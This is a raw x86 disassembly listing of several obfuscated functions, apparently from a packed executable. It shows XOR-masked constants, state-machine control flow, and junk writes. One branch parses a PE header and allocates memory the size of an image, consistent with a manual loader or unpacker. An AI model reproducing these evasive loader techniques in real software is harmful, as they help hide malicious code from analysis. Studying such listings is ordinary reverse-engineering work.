  427620:	mov    ecx,DWORD PTR [ebp-0xc]
  427623:	mov    ecx,DWORD PTR [ecx]
  427625:	xor    ecx,edi
  427627:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272aa]
  42762e:	or     al,cl
  427630:	mov    ecx,DWORD PTR [ebp+0xc]
  427633:	mov    ecx,DWORD PTR [ecx]
  427635:	xor    ecx,edi
  427637:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272ae]
  42763e:	cmp    cl,al
  427640:	jne    0x427692
  427642:	mov    eax,DWORD PTR [ebp-0x14]
  427645:	mov    eax,DWORD PTR [eax]
  427647:	xor    eax,edi
  427649:	mov    al,BYTE PTR [ebp+eax*1+0x3272aa]
  427650:	mov    ecx,DWORD PTR [ebp-0xc]
  427653:	mov    ecx,DWORD PTR [ecx]
  427655:	xor    ecx,edi
  427657:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272aa]
  42765e:	xor    al,cl
  427660:	mov    ecx,DWORD PTR [ebp-0x10]
  427663:	mov    ecx,DWORD PTR [ecx]
  427665:	xor    ecx,edi
  427667:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272aa]
  42766e:	or     al,cl
  427670:	mov    ecx,DWORD PTR [ebp-0x14]
  427673:	mov    ecx,DWORD PTR [ecx]
  427675:	xor    ecx,edi
  427677:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272ae]
  42767e:	cmp    cl,al
  427680:	jne    0x427692
  427682:	lea    eax,[ebp-0x4c]
  427685:	push   eax
  427686:	call   0x42714d
  42768b:	mov    ecx,DWORD PTR [ebp-0x44]
  42768e:	cmp    eax,ecx
  427690:	je     0x42769c
  427692:	mov    eax,DWORD PTR [ebp+0x8]
  427695:	xor    eax,edi
  427697:	add    eax,ebx
  427699:	mov    DWORD PTR [ebp+0x18],eax
  42769c:	mov    eax,DWORD PTR [ebp-0x8]
  42769f:	xor    eax,edi
  4276a1:	lea    eax,[eax+esi*1+0x3272f6]
  4276a8:	xor    eax,edi
  4276aa:	mov    ecx,DWORD PTR [ebp+0x8]
  4276ad:	mov    edx,DWORD PTR [ebp+0x18]
  4276b0:	xor    ecx,edi
  4276b2:	add    ecx,ebx
  4276b4:	cmp    edx,ecx
  4276b6:	je     0x4274b3
  4276bc:	mov    eax,DWORD PTR [ebp+0x8]
  4276bf:	mov    ecx,DWORD PTR [ebp+0x18]
  4276c2:	xor    eax,edi
  4276c4:	add    eax,ebx
  4276c6:	cmp    ecx,eax
  4276c8:	jne    0x4276db
  4276ca:	mov    eax,DWORD PTR [ebp-0x8]
  4276cd:	mov    ecx,DWORD PTR [ebp+0x1c]
  4276d0:	xor    eax,edi
  4276d2:	lea    eax,[eax+ecx*1+0x3272f6]
  4276d9:	jmp    0x427752
  4276db:	push   0x18
  4276dd:	push   DWORD PTR [ebp-0x4]
  4276e0:	lea    eax,[ebp-0x64]
  4276e3:	push   eax
  4276e4:	call   0x4269c7
  4276e9:	mov    eax,DWORD PTR [ebp+0x8]
  4276ec:	mov    ecx,DWORD PTR [ebp-0x18]
  4276ef:	xor    eax,edi
  4276f1:	add    eax,ebx
  4276f3:	cmp    eax,ecx
  4276f5:	je     0x42770a
  4276f7:	mov    eax,DWORD PTR [ebp+0x8]
  4276fa:	xor    eax,edi
  4276fc:	add    eax,ebx
  4276fe:	push   eax
  4276ff:	push   0x18
  427701:	lea    eax,[ebp-0x64]
  427704:	push   eax
  427705:	call   0x426fad
  42770a:	mov    eax,DWORD PTR [ebp-0x4]
  42770d:	add    eax,0x18
  427710:	mov    DWORD PTR [ebp+0x18],eax
  427713:	push   DWORD PTR [ebp-0x50]
  427716:	push   DWORD PTR [ebp+0x18]
  427719:	mov    eax,DWORD PTR [ebp-0x54]
  42771c:	add    eax,DWORD PTR [ebp-0x20]
  42771f:	push   eax
  427720:	call   0x4269c7
  427725:	mov    eax,DWORD PTR [ebp+0x8]
  427728:	mov    ecx,DWORD PTR [ebp-0x18]
  42772b:	xor    eax,edi
  42772d:	add    eax,ebx
  42772f:	cmp    eax,ecx
  427731:	je     0x427744
  427733:	push   0x0
  427735:	push   DWORD PTR [ebp-0x50]
  427738:	mov    eax,DWORD PTR [ebp-0x54]
  42773b:	add    eax,DWORD PTR [ebp-0x20]
  42773e:	push   eax
  42773f:	call   0x426fad
  427744:	mov    eax,DWORD PTR [ebp-0x24]
  427747:	mov    ecx,DWORD PTR [ebp-0x50]
  42774a:	add    DWORD PTR [eax],ecx
  42774c:	mov    eax,DWORD PTR [ebp-0x50]
  42774f:	add    eax,DWORD PTR [ebp+0x1c]
  427752:	mov    DWORD PTR [ebp+0x1c],eax
  427755:	mov    eax,DWORD PTR [ebp-0x8]
  427758:	mov    ecx,DWORD PTR [ebp+0x1c]
  42775b:	xor    eax,edi
  42775d:	add    eax,ebx
  42775f:	imul   eax,ecx
  427762:	mov    ecx,DWORD PTR [ebp+0x8]
  427765:	mov    edx,DWORD PTR [ebp-0x28]
  427768:	xor    ecx,edi
  42776a:	lea    ecx,[ecx+edx*1+0x3272f6]
  427771:	cmp    eax,ecx
  427773:	jb     0x4273d1
  427779:	mov    esi,DWORD PTR [ebp+0x14]
  42777c:	mov    eax,DWORD PTR [ebp-0x20]
  42777f:	mov    DWORD PTR [esi],eax
  427781:	jmp    0x4277c8
  427783:	mov    ecx,DWORD PTR [ebp+0x8]
  427786:	mov    edx,DWORD PTR [ebp+0xc]
  427789:	xor    ecx,edi
  42778b:	xor    edx,edi
  42778d:	add    ecx,ebx
  42778f:	add    edx,ebx
  427791:	cmp    ecx,edx
  427793:	jne    0x4277a7
  427795:	mov    eax,ds:0x7f642dde
  42779a:	imul   eax,eax,0x9f15fccf
  4277a0:	mov    ds:0x7f642dde,eax
  4277a5:	jmp    0x4277c8
  4277a7:	mov    ecx,DWORD PTR [ebp+0x8]
  4277aa:	xor    ecx,edi
  4277ac:	add    ecx,ebx
  4277ae:	cmp    eax,ecx
  4277b0:	je     0x4277be
  4277b2:	sub    DWORD PTR ds:0xf861e3e,0x709beac2
  4277bc:	jmp    0x4277c8
  4277be:	and    DWORD PTR ds:0x3343fade,0x5265ec3f
  4277c8:	pop    edi
  4277c9:	pop    esi
  4277ca:	pop    ebx
  4277cb:	leave  
  4277cc:	ret    0x18
  4277cf:	push   ebp
  4277d0:	mov    ebp,esp
  4277d2:	and    esp,0xfffffff8
  4277d5:	mov    eax,DWORD PTR [ebp+0x20]
  4277d8:	sub    esp,0x14
  4277db:	push   ebx
  4277dc:	mov    ebx,DWORD PTR [ebp+0x14]
  4277df:	push   esi
  4277e0:	push   edi
  4277e1:	cmp    eax,0xf89c85a5
  4277e6:	jne    0x4277f2
  4277e8:	push   0xf89c85a4
  4277ed:	jmp    0x427924
  4277f2:	mov    eax,DWORD PTR [ebp+0x20]
  4277f5:	cmp    eax,0xf89c85a4
  4277fa:	jne    0x427806
  4277fc:	push   0xf89c85a3
  427801:	jmp    0x427924
  427806:	mov    eax,DWORD PTR [ebp+0x20]
  427809:	cmp    eax,0xf89c85a3
  42780e:	jne    0x42781a
  427810:	push   0xf89c85a2
  427815:	jmp    0x427924
  42781a:	mov    eax,DWORD PTR [ebp+0x20]
  42781d:	cmp    eax,0xf89c85a2
  427822:	jne    0x42782e
  427824:	push   0xf89c85a1
  427829:	jmp    0x427924
  42782e:	mov    ecx,DWORD PTR [ebp+0x20]
  427831:	mov    eax,0xf89c85be
  427836:	cmp    ecx,eax
  427838:	jne    0x4278f4
  42783e:	mov    eax,DWORD PTR [ebp+0x10]
  427841:	mov    DWORD PTR [esp+0xc],eax
  427845:	mov    eax,DWORD PTR [ebp+0x18]
  427848:	mov    DWORD PTR [esp+0x14],eax
  42784c:	mov    eax,DWORD PTR [ebp+0xc]
  42784f:	mov    DWORD PTR [esp+0x18],eax
  427853:	mov    eax,DWORD PTR [ebp+0x8]
  427856:	mov    DWORD PTR [esp+0x10],eax
  42785a:	mov    eax,DWORD PTR [esp+0x10]
  42785e:	mov    ecx,DWORD PTR [esp+0x14]
  427862:	mov    edi,0x75108af
  427867:	xor    eax,edi
  427869:	mov    esi,0x3272f6
  42786e:	add    eax,esi
  427870:	mov    DWORD PTR [ecx],eax
  427872:	mov    eax,DWORD PTR [esp+0xc]
  427876:	mov    eax,DWORD PTR [eax+0x194]
  42787c:	mov    ecx,DWORD PTR [eax]
  42787e:	mov    eax,DWORD PTR [esp+0xc]
  427882:	mov    eax,DWORD PTR [eax+0x194]
  427888:	mov    eax,DWORD PTR [eax]
  42788a:	add    eax,DWORD PTR [ecx+0x3c]
  42788d:	mov    ecx,DWORD PTR [esp+0xc]
  427891:	mov    ecx,DWORD PTR [ecx+0x1e0]
  427897:	mov    ecx,DWORD PTR [ecx+0x14]
  42789a:	push   0x4
  42789c:	push   0x3000
  4278a1:	push   DWORD PTR [eax+0x50]
  4278a4:	push   0x0
  4278a6:	call   ecx
  4278a8:	mov    DWORD PTR [ebx],eax
  4278aa:	mov    eax,DWORD PTR [esp+0x10]
  4278ae:	push   DWORD PTR [esp+0xc]
  4278b2:	xor    eax,edi
  4278b4:	add    eax,esi
  4278b6:	mov    DWORD PTR [esp+0x20],eax
  4278ba:	lea    eax,[esp+0x20]
  4278be:	push   eax
  4278bf:	push   ebx
  4278c0:	push   DWORD PTR [esp+0x20]
  4278c4:	push   DWORD PTR [esp+0x28]
  4278c8:	push   DWORD PTR [esp+0x24]
  4278cc:	call   0x427291
  4278d1:	mov    eax,DWORD PTR [esp+0x10]
  4278d5:	mov    ecx,DWORD PTR [ebx]
  4278d7:	xor    eax,edi
  4278d9:	add    eax,esi
  4278db:	cmp    ecx,eax
  4278dd:	je     0x42793b
  4278df:	mov    eax,DWORD PTR [esp+0x18]
  4278e3:	mov    ecx,DWORD PTR [esp+0x14]
  4278e7:	xor    eax,edi
  4278e9:	add    eax,esi
  4278eb:	imul   eax,DWORD PTR [esp+0x1c]
  4278f0:	mov    DWORD PTR [ecx],eax
  4278f2:	jmp    0x42793b
  4278f4:	mov    ecx,DWORD PTR [ebp+0x20]
  4278f7:	cmp    ecx,0xf89c85a1
  4278fd:	jne    0x427906
  4278ff:	push   0xf89c85a0
  427904:	jmp    0x427924
  427906:	mov    ecx,DWORD PTR [ebp+0x20]
  427909:	cmp    ecx,0xf89c85a0
  42790f:	jne    0x427918
  427911:	push   0xf89c85bf
  427916:	jmp    0x427924
  427918:	mov    ecx,DWORD PTR [ebp+0x20]
  42791b:	cmp    ecx,0xf89c85bf
  427921:	jne    0x42793b
  427923:	push   eax
  427924:	push   DWORD PTR [ebp+0x1c]
  427927:	push   DWORD PTR [ebp+0x18]
  42792a:	push   ebx
  42792b:	push   DWORD PTR [ebp+0x10]
  42792e:	push   DWORD PTR [ebp+0xc]
  427931:	push   DWORD PTR [ebp+0x8]
  427934:	call   0x4277cf
  427939:	mov    DWORD PTR [ebx],eax
  42793b:	mov    eax,DWORD PTR [ebx]
  42793d:	pop    edi
  42793e:	pop    esi
  42793f:	pop    ebx
  427940:	mov    esp,ebp
  427942:	pop    ebp
  427943:	ret    0x1c
  427946:	push   ebp
  427947:	mov    ebp,esp
  427949:	sub    esp,0xc
  42794c:	mov    eax,0xf89c85a5
  427951:	mov    DWORD PTR [ebp-0x8],eax
  427954:	mov    DWORD PTR [ebp-0xc],0xf89c85a4
  42795b:	mov    ecx,DWORD PTR [ebp-0x8]
  42795e:	xor    ecx,0x75108af
  427964:	add    ecx,0x3272f6
  42796a:	mov    DWORD PTR [ebp-0x4],ecx
  42796d:	mov    ecx,DWORD PTR [ebp+0xc]
  427970:	push   eax
  427971:	mov    DWORD PTR [ebp+0xc],ecx
  427974:	push   DWORD PTR [ebp+0xc]
  427977:	lea    eax,[ebp-0x4]
  42797a:	push   DWORD PTR [ebp+0x8]
  42797d:	push   eax
  42797e:	push   DWORD PTR [ebp+0xc]
  427981:	push   DWORD PTR [ebp-0xc]
  427984:	push   DWORD PTR [ebp-0x8]
  427987:	call   0x4277cf
  42798c:	mov    DWORD PTR [ebp-0x4],eax
  42798f:	mov    eax,DWORD PTR [ebp-0x4]
  427992:	leave  
  427993:	ret    0x8
